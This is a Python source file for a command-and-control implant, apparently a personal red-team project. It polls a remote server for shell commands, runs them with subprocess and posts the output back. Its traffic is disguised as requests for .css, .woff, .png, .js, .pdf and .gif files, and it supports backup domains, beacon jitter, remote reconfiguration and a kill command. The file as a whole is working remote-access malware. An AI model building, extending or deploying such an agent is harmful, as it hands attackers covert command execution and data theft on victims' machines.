# NOTE: This is a newer agent file to handle more advanced beacon and session communication
# At some point the agent_html.py will be reintegrated in some form here
from os import error
from sys import stderr
import time
import random
from flask import request
import requests
import subprocess
from typing import List

# Honestly probably the smart thing would be to just copy from what they have in sliver, as those are likely mapped to go use cases
# For now though:

# .css - Key exchange (to be implemented once we add encryption)
# .png - close session messages
# .woff - Gets information on a beacon request
# .js - session messages


# TODO: Make it such that the agent sends using a protobuf, rather than a json, using json for now as honestly it is just easier. I ain't trying to be an attacker
# TODO: Make it so that there is a timer or handler to swtich to an alternate domain if this domain is not response
# TODO: Make it such that a command list can specify whether or not a response should be sent back!
class Agent:
    def __init__(
        self,
        domains: list[str],
        mode: str = "b",
        session=None,
        beacon_timer: int = 60,
        watchdog_timer: int = 7000,
    ):
        """Agent class:

        Args:
            domains - a list of domains that the agent can utilize for communication
                    the first domain is the primary domain, and all others afterwards are backups

            mode - sets the starting mode of the agent, either session or beacon based communication.
                set to beacon by default
        """

        self.domains = domains
        self.mode = mode
        self.stayAlive = True
        self.activeDomain = domains[0]
        self.session = None

        # NOTE: Other things that can be added here in the future
        # encoders - the type of encoders that are used/available
        # url params - different url paramters to obfuscate

        # Timers that dictate the agents communication and timeouts
        # Inspired by the timeouts that are used in MITRE Caldera

        self.beacon_inter = beacon_timer

        # How long the agent waits for an unreachable server before terminating itself
        # If there is a backup domain, the agent will switch to that domain
        self.watchdog_timer = watchdog_timer
        # Modification check sees if we need to request modifications from the server
        self.modification_check = False

    ##TOTAL EXECUTION FUNCTIONS##
    # The below fucntions handle the entire execution process for beaconining, polling, and agent modificaiton commands

    def execute_beacon_chain(self):
        """Executes the entire chain of beaconing including the execution and the sending back of commands
        Returns:
            - True if the chain of sending was sucessful
            - False if the chain of sending the command was not sucessful
        """

        if not self.is_beacon():
            raise ValueError("Beacon command called on an agent set to long poll")

        # The agent checks in to see if commands are available
        commands = self._check_in()

        if commands:
            self.check_for_modification_flag(commands)
            results = self._execute_commands(commands)
            return self._beacon_back(commands, results)
        else:
            # Means that no commands were recieved (or there was a connection erorr and we sleep)
            return False

    def execute_poll_sequence(self):
        """
        Function to be called to repeatedly poll the agent, this should be in a while loop of sorts
        """

        if self.is_beacon():
            raise ValueError("Long Polling command called on beacon agent")

        # Establish a long polling session
        self.session = requests.Session()

        commands = self._long_poll()

        if commands:
            self.check_for_modification_flag(commands)
            results = self._execute_commands(commands)
            self._long_poll_back(commands, results)
            return True
        else:
            return False

    def apply_modification_commands(self):
        """
        Higher level function that manages the whole flow of applying modification commands
            - Gets the commands from the server
            - parses them
            - Applies them

            Returns:
                Two parallel arrays which contain a list of the commands that were parsed and executed (or attempted to be) as well as the output
                    commands - All the commands that were parsed and called
                    results - the results of those commands
        """

        unparsed_commands = self.get_modification_commands()
        if unparsed_commands:
            results = []
            clean_commands = self._parse_modification_commands(unparsed_commands)
            for cmd_type, cmd_value in clean_commands:
                try:
                    result = self._handle_modification_command(
                        cmd_type=cmd_type, cmd_value=cmd_value
                    )
                    results.append(result)
                except Exception as e:
                    results.append(str(e))

            print(f"This is the results:{results}")
            print(f"This is the commands:{clean_commands}")

            # Send results back
            self._send_modification_command_results(unparsed_commands, results)

            self.modification_check = False
            return True
        else:
            # In the case where no commands were found at the agent modification command endpoint
            self.modification_check = False
            # send results back that no commands were found
            return None

    def _beacon_back(self, commands, results) -> bool:
        """Beacons back the output of any commands to the C2 server
        Args:
            commands: List of original commands that were executed
            results: List of command results/outputs
        Returns:
            True - Results were successfully sent back
            False - Results were not sucessfully sent back"""

        if not self.is_beacon():
            raise ValueError("Beacon command called on an agent set to long poll")

        self.session = requests.Session()

        try:
            # TODO: This should also have the nonce and have some randomly generated names for the files
            payload = {"commands": commands, "results": results}

            request = self.session.post(
                f"http://{self.activeDomain}/fjioawejfoew/jfioewajfo/test.css",
                json=payload,
            )

            # Check for any failed connections or attempts
            request.raise_for_status()

            return True

        except requests.exceptions.Timeout:
            print("Request timed out")
        except requests.exceptions.ConnectionError:
            print("Connection error occurred")
        except requests.exceptions.HTTPError as e:
            print(f"HTTP error: {e}")
            # Here might be where the watchdog_timer and itnerval timer setting is set up
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
        except Exception as e:
            print(f"Unexpecd error: {e}")

        return False

    def _check_in(self) -> List[str] | None:
        """Obtains any available commands if there are any, if no commands are available it fails"""

        if not self.is_beacon():
            raise ValueError("Beacon command called on an agent set to long poll")
        # Generate a session
        self.session = requests.Session()

        # TODO: In the future, this request is going to require: encryption, nonce and obfuscation

        try:
            request = self.session.get(
                # TODO: In the futeu this should be a randomly generated URL and woff file
                f"http://{self.activeDomain}/jfiowe/jfioewfj/test.woff"
            )
            request.raise_for_status()

            # Otherwise we obtain the available commands
            response = request.json()
            return response["commands"]

        except requests.exceptions.Timeout:
            print("Request timed out")
        except requests.exceptions.ConnectionError:
            print("Connection error occurred")
        except requests.exceptions.HTTPError as e:
            print(f"HTTP error: {e}")
            # Here might be where the watchdog_timer and itnerval timer setting is set up
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
        except Exception as e:
            print(f"Unexpecd error: {e}")

        return None

    def _long_poll(self):
        # long poll url
        if self.is_beacon():
            raise ValueError("Long Polling command called on beacon agent")
        if not self.session:
            raise ValueError("No session is being passed for long polling")

        long_poll_request_url = f"http://{self.activeDomain}/foew/fjewoj/test.png"
        try:
            request = self.session.get(url=long_poll_request_url)
            request.raise_for_status()

            response = request.json()
            return response["commands"]

        except requests.exceptions.Timeout:
            print("Request timed out")
        except requests.exceptions.ConnectionError:
            print("Connection error occurred")
        except requests.exceptions.HTTPError as e:
            print(f"HTTP error: {e}")
            # Here might be where the watchdog_timer and itnerval timer setting is set up
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
        except Exception as e:
            print(f"Unexpecd error: {e}")

        return None

    def _long_poll_back(self, commands, results):
        if self.is_beacon():
            raise ValueError("Long Polling command called on beacon agent")

        if self.is_beacon():
            raise ValueError("Long Polling command called on beacon agent")
        if not self.session:
            raise ValueError("No session is being passed for long polling")

        long_poll_results_url = f"http://{self.activeDomain}/foew/fjewoj/test.js"
        try:
            payload = {"commands": commands, "results": results}
            request = self.session.post(url=long_poll_results_url, json=payload)
            request.raise_for_status()

            return True
        except requests.exceptions.Timeout:
            print("Request timed out")
        except requests.exceptions.ConnectionError:
            print("Connection error occurred")
        except requests.exceptions.HTTPError as e:
            print(f"HTTP error: {e}")
            # Here might be where the watchdog_timer and itnerval timer setting is set up
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
        except Exception as e:
            print(f"Unexpecd error: {e}")

        return None

    def get_modification_commands(self):
        """
        Agent sends a get request to the agent modification end point and makes changes (any file with the extension .pdf)
        """

        if not self.is_modify():
            raise ValueError(
                "Modify request was called when teh agent was not in the modify mode"
            )
        self.session = requests.Session()

        # TODO: In the future, this request is going to require: encryption, nonce and obfuscation

        try:
            request = self.session.get(
                # TODO: In the future this should be randomly generated pdf file
                f"http://{self.activeDomain}/jfiowe/jfioewfj/test.pdf"
            )
            request.raise_for_status()

            response = request.json()
            return response["commands"]

        except requests.exceptions.Timeout:
            print("Request timed out")
        except requests.exceptions.ConnectionError:
            print("Connection error occurred")
        except requests.exceptions.HTTPError as e:
            print(f"HTTP error: {e}")
            # Here might be where the watchdog_timer and itnerval timer setting is set up
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
        except Exception as e:
            print(f"Unexpecd error: {e}")

        return None

    def _send_modification_command_results(self, commands, results):
        self.session = requests.Session()
        agent_mod__results_url = f"http://{self.activeDomain}/foew/fjewoj/test.gif"
        try:
            payload = {"commands": commands, "results": results}
            request = self.session.post(url=agent_mod__results_url, json=payload)
            request.raise_for_status()

            response = request.json()
            print(response)
            if response["status"] == "received":
                return True

        except requests.exceptions.Timeout:
            print("Request timed out")
        except requests.exceptions.ConnectionError:
            print("Connection error occurred")
        except requests.exceptions.HTTPError as e:
            print(f"HTTP error: {e}")
            # Here might be where the watchdog_timer and itnerval timer setting is set up
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
        except Exception as e:
            print(f"Unexpecd error: {e}")

        return None

    def check_for_modification_flag(self, commands):
        """
        Takes a list of execution commands that are pulled from the server and checks agent_modification was called and pulled through
        """
        if "agent_modification" in commands:
            commands.remove("agent_modification")
            self.modification_check = True

    def _execute_commands(self, commands_list):
        """
        Takes a list of commands, and strips them appropriately so that they can be passed to be executed
        """
        results = []

        for command in commands_list:
            command_as_list = command.split()
            print(command_as_list)
            results.append(self._execute_command(command_list=command_as_list))
        return results

    def _execute_command(self, command_list):
        """
        Executes commands (passed in as a parameter of a list) in order to run
        """
        try:
            """
            Returns a CompletedProcess object with the following attributes: 
            - .returncode
            - .stdout 
            - .stderr 
            - .args 
            """

            result = subprocess.run(
                command_list,
                capture_output=True,
                text=True,
                check=True,
            )
            return result.stdout
        except subprocess.CalledProcessError as e:
            print(f"Command failed {e.stderr}")
            return e.stderr
        except Exception as e:
            print(f"Error: {e}")
            return str(e)

    def get_beacon_range(self, range: int = 10):
        """Returns a range for the beacon as a tuple this is so it runs on a slight jitter
        Args:
            range - +- the interval set on initialization"""

        return (self.beacon_inter - range, self.beacon_inter + range)

    def _parse_modification_commands(self, unparsed_commands):
        """
        Takes a list of modification commands and pases them appropriately
        """

        commands = []
        for command in unparsed_commands:
            if ":" in command:
                cmd_type, cmd_value = command.split(":", 1)
                commands.append((cmd_type.strip(), cmd_value.strip()))
            else:
                cmd_type, cmd_value = command.strip(), None
                commands.append((cmd_type.strip(), cmd_value))

        return commands

    def _handle_modification_command(self, cmd_type: str, cmd_value: str):
        """Route modification commands to appropriate handlers using dictionary mapping"""
        handlers = {
            "watchdog": lambda v: self.set_watchdog_timer(int(v)),
            "domain_add": lambda v: self.add_domain(v),
            "domain_remove": lambda v: self.remove_domain(v),
            "domain_active": lambda v: self.set_new_active_domain(v),
            "beacon": lambda v: self.set_beacon_interval(int(v)),
            "change_mode": lambda v: self.set_mode(v),
            "kill": lambda v: self.kill(),
        }

        if cmd_type not in handlers:
            raise ValueError(f"Unknown modification command: {cmd_type}")

        return handlers[cmd_type](cmd_value)

    def remove_domain(self, domain):
        """
        Remove a domain that is in the domains list
        Will not remove a domain if it is the last domain in the list
        """
        if domain not in self.domains:
            raise ValueError(f"Domain '{domain}' not found in domains list")

        if len(self.domains) <= 1:
            raise ValueError("Cannot remove domain: it is the only remaining domain")

        # If removing active domain, switch to another one first
        if domain == self.activeDomain:
            new_active = next(d for d in self.domains if d != domain)
            self.activeDomain = new_active
            print(f"Switched active domain to {new_active}")

        self.domains.remove(domain)
        return f"Removed domain: {domain}"

    def add_domain(self, domain):
        """Add domain"""
        if not domain:
            raise ValueError("Domain cannot be empty")
        if domain in self.domains:
            raise ValueError(f"Domain '{domain}' already exists in domains list")
        self.domains.append(domain)
        return f"Domain '{domain}' added successfully"

    def set_new_active_domain(self, domain):
        """
        Set a new active domain, either due to user input, or because of failed requests to the previously set domain
        """
        if not domain:
            raise ValueError("Domain cannot be empty")
        if domain not in self.domains:
            raise ValueError(f"Domain '{domain}' not in available domains list")
        self.activeDomain = domain
        return f"Active domain set to {domain}"

    def is_alive(self):
        return self.stayAlive

    def kill(self):
        """
        Agent should kill either if all domains have failed to been reahced for a specific amount off time or because of user instructions
        """
        # Maybe there should be some self deletion code? I have no idea how that would work, but that could be worht looking into!
        # Delete the file, then just shut down the process that is being ran?
        self.stayAlive = False
        return "Agent terminated"

    def is_beacon(self):
        return self.mode == "b"

    def _set_beacon(self):
        self.mode = "b"
        return

    def set_beacon_interval(self, interval: int):
        """Set beacon interval"""
        if not isinstance(interval, int) or interval < 1:
            raise ValueError("Beacon interval must be positive integer")
        self.beacon_inter = interval
        return f"Beacon interval set to {interval} seconds"

    def set_watchdog_timer(self, timer: int):
        """Set watchdog timer"""
        if not isinstance(timer, int) or timer < 1:
            raise ValueError("Watchdog timer must be positive integer")
        self.watchdog_timer = timer
        return f"Watchdog timer set to {timer} seconds"

    def is_modify(self):
        return self.modification_check

    def _set_long_poll(self):
        self.mode = "l"
        # Set a session for the longpolling
        self.session = requests.Session()
        return

    def set_mode(self, mode: str):
        """Set agent mode"""
        if mode == "l":
            self._set_long_poll()
            return "Switched to long-poll mode"
        elif mode == "b":
            self._set_beacon()
            return "Switched to beacon mode"
        else:
            raise ValueError(f"Invalid mode: {mode}")


# Note to self, if debugging (remember that one time I know you do) this makes it so that main DOES not run fi this is an import
if __name__ == "__main__":
    # Execution loop for the agent running at some point this should be what is ran in the executable
    agent = Agent(["localhost2"])

    while agent.is_alive():
        # If the modification command boolean is true:
        if agent.is_modify():
            # We call continue here os that if the kill command is passed, we terminate
            agent.apply_modification_commands()
            continue
        # TODO: What happens if both of these fail, what is hte backup mechanism?
        # Check to see whether the agent in long polling mode or not
        if agent.is_beacon():
            agent.execute_beacon_chain()
            # Set to sleep for the beacon chain
        else:
            # This just needs to constantly be called
            while agent.is_alive() and not agent.is_modify():
                agent.execute_poll_sequence()
